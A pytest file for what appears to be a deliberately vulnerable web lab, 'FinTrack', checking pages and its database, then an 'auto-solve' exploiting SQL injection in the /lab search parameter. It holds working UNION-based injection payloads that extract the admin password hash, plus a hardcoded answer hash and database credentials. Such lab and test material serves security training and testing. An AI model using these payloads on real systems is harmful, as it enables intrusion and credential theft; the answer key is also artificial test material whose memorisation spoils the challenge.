import pytest
import requests
import time
import mysql.connector
import os
from urllib.parse import quote

class TestFinTrackApp:
    """Test suite for FinTrack application"""
    
    @pytest.fixture(scope="class")
    def base_url(self):
        """Base URL for the application"""
        return "http://localhost:3206"
    
    @pytest.fixture(scope="class")
    def db_connection(self):
        """Database connection for testing"""
        connection = mysql.connector.connect(
            host="localhost",
            user="fintrack_user",
            password="fintrack_pass",
            database="fintrack_db",
            port=3306
        )
        yield connection
        connection.close()
    
    def test_homepage_accessible(self, base_url):
        """Test that homepage is accessible"""
        response = requests.get(base_url)
        assert response.status_code == 200
        assert "FinTrack" in response.text
    
    def test_lab_page_accessible(self, base_url):
        """Test that lab page is accessible"""
        response = requests.get(f"{base_url}/lab")
        assert response.status_code == 200
        assert "Team Member Dashboard" in response.text
    
    def test_search_functionality_normal(self, base_url):
        """Test normal search functionality"""
        response = requests.get(f"{base_url}/lab?search=john")
        assert response.status_code == 200
        assert "John Doe" in response.text
    
    def test_search_functionality_empty(self, base_url):
        """Test search with empty query shows all results"""
        response = requests.get(f"{base_url}/lab")
        assert response.status_code == 200
        assert "All Team Members" in response.text
        assert "John Doe" in response.text
        assert "Jane Smith" in response.text
    
    def test_api_search_endpoint(self, base_url):
        """Test API search endpoint"""
        response = requests.get(f"{base_url}/api/search?q=admin")
        assert response.status_code == 200
        data = response.json()
        assert isinstance(data, list)
        assert len(data) > 0
    
    def test_metadata_api(self, base_url):
        """Test metadata API endpoint"""
        response = requests.get(f"{base_url}/api/metadata")
        assert response.status_code == 200
        data = response.json()
        assert "site" in data
        assert data["site"]["name"] == "FinTrack"
    
    def test_database_connection(self, db_connection):
        """Test database connection and basic queries"""
        cursor = db_connection.cursor(dictionary=True)
        cursor.execute("SELECT COUNT(*) as count FROM users")
        result = cursor.fetchone()
        assert result["count"] > 0
        cursor.close()
    
    def test_users_table_structure(self, db_connection):
        """Test that users table has expected structure"""
        cursor = db_connection.cursor(dictionary=True)
        cursor.execute("DESCRIBE users")
        columns = cursor.fetchall()
        column_names = [col["Field"] for col in columns]
        
        # Check for obfuscated column names
        assert "xyz_username" in column_names
        assert "abc_password_hash" in column_names
        assert "def_email" in column_names
        assert "ghi_full_name" in column_names
        cursor.close()
    
    def test_admin_user_exists(self, db_connection):
        """Test that admin user exists in database"""
        cursor = db_connection.cursor(dictionary=True)
        cursor.execute("SELECT * FROM users WHERE xyz_username = 'admin'")
        result = cursor.fetchone()
        assert result is not None
        assert result["ghi_full_name"] == "Administrator"
        cursor.close()

class TestSQLInjectionVulnerability:
    """Test suite for SQL injection vulnerability exploitation"""
    
    @pytest.fixture(scope="class")
    def base_url(self):
        return "http://localhost:3206"
    
    def test_sql_injection_detection(self, base_url):
        """Test basic SQL injection detection"""
        # Test with single quote to detect vulnerability
        payload = "'"
        response = requests.get(f"{base_url}/lab?search={quote(payload)}")
        assert response.status_code == 200
        
        # If vulnerable, should still return page (no error)
        # This is a basic test - real exploitation would need more sophisticated detection
    
    def test_union_injection_column_count(self, base_url):
        """Test UNION injection to find column count"""
        # Test different column counts
        for i in range(1, 10):
            payload = f"' UNION SELECT {','.join(['1'] * i)}--"
            response = requests.get(f"{base_url}/lab?search={quote(payload)}")
            assert response.status_code == 200
            
            # If successful, we should see different results
            # This is a basic test - real exploitation would analyze response differences
    
    def test_union_injection_data_extraction(self, base_url):
        """Test UNION injection for data extraction"""
        # Test extracting admin password hash using column index
        # Assuming 7 columns based on the query structure
        payload = "' UNION SELECT 1,2,3,abc_password_hash,5,6,7 FROM users WHERE xyz_username='admin'--"
        response = requests.get(f"{base_url}/lab?search={quote(payload)}")
        assert response.status_code == 200
        
        # Check if password hash appears in response
        # The hash should be: $2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi
        assert "$2y$10$" in response.text
    
    def test_auto_solve_vulnerability(self, base_url):
        """Auto-solve test for the SQL injection vulnerability"""
        print("\n=== AUTO-SOLVE: SQL Injection Vulnerability ===")
        
        # Step 1: Detect vulnerability
        print("Step 1: Detecting SQL injection vulnerability...")
        payload1 = "' OR 1=1--"
        response1 = requests.get(f"{base_url}/lab?search={quote(payload1)}")
        assert response1.status_code == 200
        print("✓ Vulnerability detected - single quote injection successful")
        
        # Step 2: Find column count
        print("Step 2: Finding correct column count...")
        for i in range(1, 10):
            payload2 = f"' UNION SELECT {','.join(['1'] * i)}--"
            response2 = requests.get(f"{base_url}/lab?search={quote(payload2)}")
            if response2.status_code == 200:
                print(f"✓ Testing {i} columns...")
                # If successful, we found the right count
                if i == 7:  # Expected column count
                    print(f"✓ Found correct column count: {i}")
                    break
        
        # Step 3: Extract admin password hash
        print("Step 3: Extracting admin password hash...")
        payload3 = "' UNION SELECT 1,2,3,abc_password_hash,5,6,7 FROM users WHERE xyz_username='admin'--"
        response3 = requests.get(f"{base_url}/lab?search={quote(payload3)}")
        assert response3.status_code == 200
        
        # Verify the hash is extracted
        expected_hash = "$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi"
        if expected_hash in response3.text:
            print("✓ SUCCESS: Admin password hash extracted successfully!")
            print(f"  Hash: {expected_hash}")
            print("✓ VULNERABILITY EXPLOITED: UNION-based SQL injection with column index extraction")
        else:
            print("✗ FAILED: Could not extract admin password hash")
            assert False, "Auto-solve failed - hash not found in response"
        
        print("=== AUTO-SOLVE COMPLETED ===\n")

if __name__ == "__main__":
    # Run the auto-solve test
    test_instance = TestSQLInjectionVulnerability()
    test_instance.test_auto_solve_vulnerability("http://localhost:3206") 